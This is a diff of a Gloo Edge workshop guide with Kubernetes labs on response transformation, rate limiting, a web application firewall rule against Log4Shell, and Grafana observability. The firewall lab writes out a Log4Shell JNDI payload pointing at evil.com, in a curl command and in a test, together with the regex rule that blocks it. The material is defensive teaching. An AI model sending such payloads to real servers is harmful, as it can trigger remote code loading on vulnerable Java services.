+  name: httpbin-options
+  namespace: gloo-system
+spec:
+  options:
+    extauth:
+      configRef:
+        name: oauth
+        namespace: gloo-system
+    stagedTransformations:
+      regular:
+        requestTransforms:     
+        - requestTransformation:
+            transformationTemplate:
+              extractors:
+                organization:
+                  header: 'X-Email'
+                  regex: '.*@(.*)$'
+                  subgroup: 1
+              headers:
+                x-organization:
+                  text: '{{ organization }}'
+        responseTransforms:     
+        - responseTransformation:
+            transformationTemplate:
+              parseBodyBehavior: DontParse
+              body:
+                text: '{% if header(":status") == "429" %}<html><body style="background-color:powderblue;"><h1>Too many Requests!</h1><p>Try again after 1 minute</p></body></html>{% else %}{{ body() }}{% endif %}'
+    jwtStaged:
+      afterExtAuth:
+        providers:
+          keycloak:
+            issuer: ${KEYCLOAK_MASTER_REALM_URL}
+            keepToken: true
+            tokenSource:
+              headers:
+              - header: jwt
+            claimsToHeaders:
+            - claim: email
+              header: x-email
+            - claim: subscription
+              header: x-subscription
+            jwks:
+              remote:
+                url: http://keycloak.keycloak.svc:8080/auth/realms/master/protocol/openid-connect/certs
+                upstreamRef:
+                  name: keycloak-keycloak-8080
+                  namespace: gloo-system
+    rateLimitConfigs:
+      refs:
+      - name: limit-users
+        namespace: gloo-system
+
+EOF
+```
+
+Refreshing your browser more than 8 times, you should see a styled HTML page indicating that you have reached the limit. 
+
+<!--bash
+cat <<'EOF' > ./test.js
+const chaiExec = require("@jsdevtools/chai-exec");
+const helpersHttp = require('./tests/chai-http');
+var chai = require('chai');
+var expect = chai.expect;
+
+describe("The response is transformed", function() {
+  let user = 'user2';
+  let password = 'password';
+  let keycloak_svc = chaiExec("kubectl -n keycloak get service keycloak -o jsonpath='{.status.loadBalancer.ingress[0].ip}'").stdout.replaceAll("'", "");
+  let keycloak_client_id = chaiExec("kubectl -n gloo-system get authconfig oauth -o jsonpath='{.spec.configs[0].oauth2.oidcAuthorizationCode.clientId}'").stdout.replaceAll("'", "");
+  let keycloak_client_secret_base64 = chaiExec("kubectl -n gloo-system get secret oauth -o jsonpath='{.data.oauth}'").stdout.replaceAll("'", "");
+  let buff = new Buffer(keycloak_client_secret_base64, 'base64');
+  let keycloak_client_secret = buff.toString('ascii').split(' ')[1].trim();
+  let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "http://' + keycloak_svc + ':8080/auth/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
+  
+  it("On the third request we get a styled page", () => {
+    helpersHttp.checkURL({ host: "https://httpbin.solo.io", headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], retCode: 200 });
+    helpersHttp.checkURL({ host: "https://httpbin.solo.io", headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], retCode: 200 });
+    helpersHttp.checkBody({ host: "https://httpbin.solo.io", 
+      headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], 
+      body: "Too many Requests!" });
+  }); 
+});
+EOF
+echo "executing test gloo-edge/templates/steps/response-transformation/tests/response-transformations.test.js.liquid"
+mocha ./test.js --retries=50 --bail 2> /dev/null || exit 1
+-->
+
+Cleanup the resources before moving to the next section.
+
+```bash
+kubectl delete vs vs-httpbin -n gloo-system
+
+kubectl delete virtualhostoption httpbin-options -n gloo-system
+```
+
+
+
+
+## Lab 9 - Web application firewall <a name="Lab-9"></a>
+
+A web application firewall (WAF) protects web applications by monitoring, filtering and blocking potentially harmful traffic and attacks that can overtake or exploit them.
+
+Gloo Edge Enterprise includes the ability to enable the ModSecurity Web Application Firewall for any incoming and outgoing HTTP connections. 
+
+An example of how using Gloo Edge we'd easily mitigate the recent Log4Shell vulnerability ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)), which for many enterprises was a major ordeal that took weeks and months of updating all services.
+
+### What is the Log4Shell vulnerability? 
+
+The Log4Shell vulnerability impacted all java applications that used the log4j library (common library used for logging) and that exposed an endpoint. You could exploit the vulnerability by simply making a request with a specific header. In the example below, we will show how to protect your services against the Log4Shell exploit. 
+
+Using the Web Application Firewall capabilities you can reject requests containing such headers. 
+
+Start by applying the virtual service to the cluster.
+
+```bash
+cat <<'EOF' | envsubst | kubectl apply -f -
+apiVersion: gateway.solo.io/v1
+kind: VirtualService
+metadata:
+  name: vs-httpbin
+  namespace: gloo-system
+spec:
+  virtualHost:
+    domains:
+      - "httpbin.solo.io"
+    routes:
+      - matchers:
+          - prefix: /
+        routeAction:
+          single:
+            upstream:
+              name: httpbin-httpbin-8000
+              namespace: gloo-system
+    options:
+      waf:
+        customInterventionMessage: 'Log4Shell malicious payload'
+        ruleSets:
+        - ruleStr: |
+            SecRuleEngine On
+            SecRequestBodyAccess On
+            SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*  
+              "@rx \${jndi:(?:ldaps?|iiop|dns|rmi)://" 
+              "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
+EOF
+```
+
+Now, if you try to make a request containing a header that exploits this vulnerability the request will be rejected before reaching the service.
+
+```bash
+curl -H "x-my-header: \${jndi:ldap://evil.com/x}" http://httpbin.solo.io/anything
+```
+
+For more information on the log4j vulnerability check our blog "[Block Log4Shell attacks with Gloo Edge](https://www.solo.io/blog/block-log4shell-attacks-with-gloo-edge/)".
+
+To learn about the WAF capabilities of Gloo Edge checkout "[Web Application Firewall - Gloo Edge Docs](https://docs.solo.io/gloo-edge/latest/guides/security/waf/)"
+
+<!--bash
+cat <<'EOF' > ./test.js
+const helpers = require('./tests/chai-http');
+
+describe("Request should be blocked for jndi header", () => {
+  it('Request is blocked', () => { 
+    helpers.checkURL({ host: "http://httpbin.solo.io", path: '/anything', headers: [{key: 'x-my-header', value: '${jndi:ldap://evil.com/x}'}], retCode: 403 });
+  });
+});
+
+EOF
+echo "executing test gloo-edge/templates/steps/web-application-firewall/tests/firewall-block-agent.test.js.liquid"
+mocha ./test.js --retries=50 --bail 2> /dev/null || exit 1
+-->
+
+
+
+
+## Lab 10 - Observability <a name="Lab-10"></a>
 
 ### Metrics
 
@@ -1814,18 +1968,18 @@ Gloo Edge automatically generates a Grafana dashboard for whole-cluster stats (o
 Let's run the following command to allow access to the Grafana UI:
 
 ```
-kubectl port-forward -n gloo-system svc/glooe-grafana 8001:80
+kubectl port-forward -n gloo-system svc/glooe-grafana 8081:80 --address 0.0.0.0
 ```
 
-You can now access the Grafana UI at http://localhost:8001 and login with `admin/admin`.
+You can now access the Grafana UI at http://localhost:8081 and login with `admin/admin`.
 
 You can take a look at the `Gloo -> Envoy Statistics` Dashboard that provides global statistics:
 
-![Grafana Envoy Statistics](images/steps/observability/grafana1.png)
+![Grafana Envoy Statistics](images/steps/observability/images/grafana-envoy-stats.png)
 
 You can also see that Gloo is dynamically generating a Dashboard for each Upstream:
 
-![Grafana Upstream](images/steps/observability/grafana-upstream.png)
+![Grafana Upstream](images/steps/observability/images/grafana-upstream.png)
 
 You can run the following command to see the default template used to generate these templates:
 
@@ -1848,15 +2002,14 @@ kind: Gateway
 metadata:
   labels:
     app: gloo
-  name: gateway-proxy-ssl
+  name: gateway-proxy
   namespace: gloo-system
 spec:
   bindAddress: '::'
-  bindPort: 8443
+  bindPort: 8080
   httpGateway: {}
   proxyNames:
   - gateway-proxy
-  ssl: true
   useProxyProto: false
   options:
     accessLoggingService:
@@ -1900,9 +2053,14 @@ Warning: kubectl apply should be used on resource created by either kubectl crea
 
 Refresh your browser a couple times to generate some traffic.
 
+You can access the application on the following URL:
+```
+/opt/google/chrome/chrome http://echo.solo.io
+```
+
 Check the access logs running the following command:
 
-```bash
+```
 kubectl logs -n gloo-system deployment/gateway-proxy | grep '^{' | jq
 ```
 
@@ -1920,11 +2078,12 @@ If you refresh the browser to send additional requests, then you will see both `
   "responseFlags": "-",
   "number": null,
   "clientDuration": 31,
-  "upstreamName": "bookinfo-beta-productpage-9080_gloo-system",
+  "upstreamName": "httpbin-httpbin-8000_gloo-system",
   "responseCode": 200
 }
 ```
 
 These logs can now be collected by the Log aggregator agents and potentially forwarded to your favorite enterprise logging service. 
+
 
 
